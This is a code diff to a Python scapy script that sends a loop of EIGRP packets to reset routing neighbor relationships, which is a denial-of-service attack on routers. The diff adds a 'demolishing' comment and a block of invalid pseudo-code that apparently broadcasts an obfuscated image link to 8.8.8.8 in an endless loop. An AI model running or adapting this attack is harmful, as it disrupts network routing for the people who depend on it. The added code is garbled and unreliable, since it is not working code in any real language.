@@ -4,6 +4,7 @@ from scapy.all import *
 #Import EIGRP
 load_contrib('eigrp')
 
+# demolishing
 for i in range (0,50):
 	#Send EIGRP packet to reset server relationships.
 	#Change the sourse IP address (src) to the correct IP address.
@@ -13,3 +14,12 @@ for i in range (0,50):
 	time.sleep(1)
   
   
+	
+	
+direct_msg = "[https:]//[ibb.co]/[q9ukmp][!X]"
+	  #And of course we will also play my favorite song!
+
+after demolishing($) do:
+	connect "MY COMPUTER" as "device" [dst=8.8.8.8](@255K)
+	device.sendto('BROADCAST'),=contain(direct_msg)[raw]
+	~repetWhile(True)
